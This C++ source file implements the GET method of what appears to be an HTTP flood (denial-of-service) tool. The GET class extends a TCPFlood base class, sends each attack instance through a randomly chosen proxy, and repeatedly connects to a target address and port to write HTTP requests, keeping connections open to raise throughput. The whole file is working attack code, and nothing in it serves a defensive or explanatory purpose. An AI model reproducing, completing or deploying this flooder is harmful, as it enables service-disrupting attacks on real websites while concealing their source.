#include "../../include/methods/GET.h"


GET::GET(string address, uint16_t port)
	:TCPFlood(address, port)
	, requestRawPathQS("/") // TODO: find out parsing similar to Python's YARL
	, requestBody("")
{	
	this->setHeader(this->getDefaultHeader());
	
	this->createRequest(this->type, requestRawPathQS, requestBody);
	
	this->getTarget()->updateProxy(ProxyManager::getInstance()->getRandomProxy());
	
	this->initNetwork();

	this->getNetworkPtr()->Create();
    if(network::State::CREATED == this->getNetworkPtr()->getState())
	{
        this->setState(flood::State::READY);
        return;
    }

    this->setState(flood::State::ERROR);
}

void GET::start()
{
	//this->setState(flood::State::RUNNING);
	// it is better to keep connection alive to avoid overhead	
    // https://stackoverflow.com/questions/20599570/is-it-better-to-keep-a-socket-open-for-frequent-requests-or-to-close-the-socket
    
    // TODO: Refactor this shit
    switch(this->getNetworkPtr()->getState())    
    {
        case(network::State::ERROR): {
            if(network::Result::RESULT_OK == this->getNetworkPtr()->Create()) {
                if(network::Result::RESULT_OK == this->getNetworkPtr()->Resolve()) {
                    if(network::Result::RESULT_OK == this->getNetworkPtr()->Connect()) {
                        this->getNetworkPtr()->Write(this->header);
                    } else {}
                } else {}
            } else {}
            break;
        }
        case(network::State::CREATED): {
            if(network::Result::RESULT_OK == this->getNetworkPtr()->Resolve()) {
                if(network::Result::RESULT_OK == this->getNetworkPtr()->Connect()) {
                    this->getNetworkPtr()->Write(this->header);
                } else {}
            } else {}
            break;
        }
        case(network::State::HOST_RESOLVED): {
                if(network::Result::RESULT_OK == this->getNetworkPtr()->Connect()) {
                    this->getNetworkPtr()->Write(this->header);
                } else {}
            break;
        }
        case(network::State::CONNECTED): {
            this->getNetworkPtr()->Write(this->header);
            break;
        }
    }    

    this->setState(flood::State::READY);
}

void GET::stop()
{
	this->setState(flood::State::HALT);
}

void GET::initNetwork()
{
	this->networkPtr = new SocketGLIBC(this->getTarget()->getAddress(), this->getTarget()->getPort());
}
